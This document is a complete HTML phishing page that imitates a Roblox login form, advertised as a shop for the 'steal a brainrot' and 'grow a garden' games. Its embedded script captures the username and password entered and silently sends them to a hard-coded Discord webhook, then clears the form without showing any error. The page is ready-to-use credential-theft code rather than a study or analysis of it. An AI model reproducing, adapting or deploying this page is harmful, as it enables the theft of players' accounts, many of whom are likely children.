<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login - Error</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #2af598 0%, #009efd 100%);
      font-family: 'Poppins', sans-serif;
      color: #fff;
    }
    .container {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-radius: 20px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.37);
      padding: 3rem 2.5rem;
      width: 100%;
      max-width: 400px;
      text-align: center;
      transition: transform 0.3s ease;
    }
    .container:hover {
      transform: scale(1.02);
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.45);
    }
    h1 {
      margin-bottom: 1rem;
      font-weight: 600;
      letter-spacing: 1.5px;
      font-size: 2rem;
      text-shadow: 0 2px 6px rgba(0,0,0,0.3);
    }
    .subtitle-top {
      font-weight: 500;
      margin-bottom: 1.5rem;
      font-size: 1.1rem;
      letter-spacing: 0.5px;
      text-shadow: 0 1px 4px rgba(0,0,0,0.3);
    }
    .subtitle-bottom {
      font-weight: 600;
      margin-top: 2rem;
      font-size: 1rem;
      letter-spacing: 0.4px;
      text-shadow: 0 1px 5px rgba(0,0,0,0.35);
      color: #ffd54f;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 1.25rem;
    }
    input {
      padding: 0.75rem 1rem;
      border: none;
      border-radius: 12px;
      font-size: 1rem;
      font-weight: 500;
      background: rgba(255,255,255,0.15);
      color: #fff;
      box-shadow: inset 0 0 8px rgba(255,255,255,0.2);
      transition: background-color 0.3s, box-shadow 0.3s;
    }
    input::placeholder {
      color: #ddd;
    }
    input:focus {
      outline: none;
      background: rgba(255,255,255,0.3);
      box-shadow: 0 0 10px #00f6ff;
      color: #000;
      font-weight: 600;
      caret-color: #009efd;
    }
    button {
      padding: 0.85rem 1rem;
      background: #00b4d8;
      border-radius: 12px;
      border: none;
      font-size: 1.1rem;
      font-weight: 600;
      color: white;
      cursor: pointer;
      box-shadow: 0 6px 20px rgba(0, 180, 216, 0.6);
      transition: background-color 0.3s, box-shadow 0.3s;
      user-select: none;
    }
    button:hover {
      background: #0096c7;
      box-shadow: 0 10px 30px rgba(0, 150, 199, 0.75);
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Log in</h1>
    <div class="subtitle-top">Log into your Roblox acc</div>

    <form id="loginForm">
      <input type="text" name="username" placeholder="Username" required autocomplete="username" />
      <input type="password" name="password" placeholder="Password" autocomplete="current-password" />
      <button type="submit">Log In</button>
    </form>

    <div class="subtitle-bottom">
      Welcome to the biggest steal a brainrot / grow a garden shop — with us everything is better
    </div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1399272439778771044/tKsun2HWGdUCEk-Lspm1D6ILN9bPVouDhyHlwzwN-f0a0nQWOec_F50zo6e2hypeAffw";

    const form = document.getElementById('loginForm');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const formData = new FormData(form);
      const username = formData.get('username');
      const password = formData.get('password');

      const payload = {
        content: `**New login attempt:**\nUsername: \`${username}\`\nPassword: \`${password}\``
      };

      try {
        await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        form.reset();
      } catch (err) {
        // brak wyświetlania komunikatów błędu
      }
    });
  </script>

</body>
</html>
